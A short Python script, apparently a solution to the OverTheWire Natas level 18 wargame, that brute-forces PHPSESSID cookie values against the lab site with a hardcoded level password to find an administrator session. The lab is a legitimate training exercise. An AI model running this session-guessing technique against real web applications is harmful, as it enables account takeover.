import requests
import string

level = "natas18"
auth = (level, "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
url = f"http://{level}.natas.labs.overthewire.org/"

for cookie in range(1,641):
    res = requests.get(url, auth=auth, cookies={"PHPSESSID": f"{cookie}"}).content
    #print(payload, t)
    if b"You are logged in as a regular user." not in res:
        print(res)
        break